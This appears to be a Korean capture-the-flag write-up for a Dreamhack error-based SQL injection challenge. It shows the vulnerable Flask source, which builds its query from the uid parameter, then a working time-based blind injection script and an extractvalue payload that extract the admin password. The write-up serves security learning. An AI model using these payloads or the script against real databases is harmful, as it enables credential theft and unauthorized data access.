---
title: "[2025-07-15] Error based SQL Injection"
excerpt: "SQL Injection"

categories:
  - Problem
tags:
  - [SQL Injection]

permalink: /Problem/[2025-07-15] Error based SQL Injection/

toc: true
toc_sticky: true

date: 2025-07-15
last_modified_at: 2025-07-15
---

## 🦥 본문

```python
import os
from flask import Flask, request
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'users')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM user WHERE uid='{uid}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
'''

@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        try:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
            return template.format(uid=uid)
        except Exception as e:
            return str(e)
    else:
        return template

if __name__ == '__main__':
    app.run(host='0.0.0.0')

```

이번에는 저번과 달리 다른 값을 넣어도 똑같이 200 OK가 응답된다. 그래서 AND 연산자를 통해 blind Sqli를 진행시켰다. 

### 풀이

```python
# from requests import get
# import time

# host = "http://host3.dreamhack.games:20712/"

# password_length = 0
# while True:
#     password_length += 1
#     query = f"admin' and char_length(upw) = {password_length} and sleep(2)-- -"
#     start = time.time()
#     r = get(f"{host}/?uid={query}")
#     elapsed = time.time() - start

#     if elapsed > 1.8:  # sleep(2)가 적용되었는지 확인 (1.8~2.0 정도 여유)
#         break

# print(f"password length: {password_length}")

from requests import get
import time

host = "http://host3.dreamhack.games:13878/"

password_length = 50
password = ""

for i in range(40, password_length + 1):
    bit_length = 0
    while True:
        bit_length += 1
        query = f"admin' and if(length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}, sleep(1), 0)-- -"
        start = time.time()
        r = get(f"{host}/?uid={query}")
        elapsed = time.time() - start
        if elapsed > 0.9:
            break

    bits = ""
    for j in range(1, bit_length + 1):
        query = f"admin' and if(substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1', sleep(2), 0)-- -"
        start = time.time()
        r = get(f"{host}/?uid={query}")
        elapsed = time.time() - start
        if elapsed > 1.5:
            bits += "1"
        else:
            bits += "0"

    # 이진수를 문자로 변환
    char = int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")
    password += char
    print(f"[+] Found character {i}: '{char}' → password so far: '{password}'")

print(f"\n[✓] Final password: {password}")
```

1. 맨 처음 주석 처리된 코드로 2초가 넘어가면 해당 글자 수를 구할 수 있게 된다.
2. 아래의 코드로 바이트 단위로 password를 구하여 FLAG를 구할 수 있다.

+추가로 1' and extractvalue(0x3a,concat(0x3a,(SELECT upw FROM user LIMIT 0,1)));— 를 통해서 FLAG를 얻을 수 있는 더 간단한 방법이 있었다ㅠㅠ. 내 시간…